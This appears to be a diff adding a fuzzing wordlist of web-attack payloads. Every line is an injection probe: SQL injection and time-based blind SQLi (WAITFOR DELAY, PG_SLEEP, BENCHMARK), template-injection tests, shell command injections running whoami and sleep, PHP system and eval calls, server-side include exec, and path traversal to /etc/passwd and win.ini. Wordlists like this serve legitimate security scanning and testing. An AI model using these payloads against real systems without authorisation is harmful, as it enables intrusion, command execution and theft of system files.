@@ -1,0 +1,84 @@
+'"(){}; -- -#/*
+"')};({; -- -#/*//
+' or '1'='1'-- -
+${{<%[%'"}}%\.
+{{7*7}}
+{7*7}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+${{7*7}}
+#{{7*7}}
+7*7
+&lt;!--#exec%20cmd=&quot;/usr/bin/whoami;--&gt;
+&lt;!--#exec%20cmd=&quot;whoami;--&gt;
+| whoami
+& whoami
+&& whoami
+|| whoami
+; whoami
+|whoami|
+;system('whoami')
+\nwhoami\n
+|nwhoami\n
+a);/usr/bin/whoami
+a;/usr/bin/whoami
+a);/usr/bin/whoami;
+a;/usr/bin/whoami;
+a);/usr/bin/whoami|
+a;/usr/bin/whoami|
+a)|/usr/bin/whoami
+a|/usr/bin/whoami
+a)|/usr/bin/whoami;
+a|/usr/bin/whoami
+<?php system("whoami");?>
+$(`whoami`)
+|| phpinfo()
+| phpinfo()
+; phpinfo()
+../../../../../etc/passwd
+../../../../../windows/win.ini
+../../../../../etc/passwd%00
+%00../../../../../etc/passwd%00
+....//....//....//....//etc/passwd
+..\..\..\..\windows\win.ini
+....\\....\\....\\....\\windows\win.ini
+../\../\../\../\windows\win.ini
+..\/..\/..\/..\/windows\win.ini
+..\..\..\..\windows\win.ini%00
+%00..\..\..\..\windows\win.ini%00
+..\..\..\..\windows\win.ini
+eval('echo XXXXXXXXXXXXXXXXX')
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo XXXXXXXXXXXXXX')
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+|| sleep 10
+| sleep 10
+; sleep 10
+{${sleep(10)}}
+%20{${sleep(20)}}
+& sleep 10 
+&& sleep 10
+sleep 10
+|| sleep 15
+| sleep 15
+; sleep 15
+& sleep 15
+&& sleep 15
+;WAITFOR DELAY '0:0:5'-- -
+);WAITFOR DELAY '0:0:5'-- -
+');WAITFOR DELAY '0:0:5'-- -
+;WAIT FOR DELAY '0:0:5'-- -
+);WAIT FOR DELAY '0:0:5'-- -
+');WAIT FOR DELAY '0:0:5'-- -
+;SELECT PG_SLEEP(5)--
+);SELECT PG_SLEEP(5)--
+');SELECT PG_SLEEP(5)--
+-SLEEP(15)
+-BENCHMARK(100000000, rand())
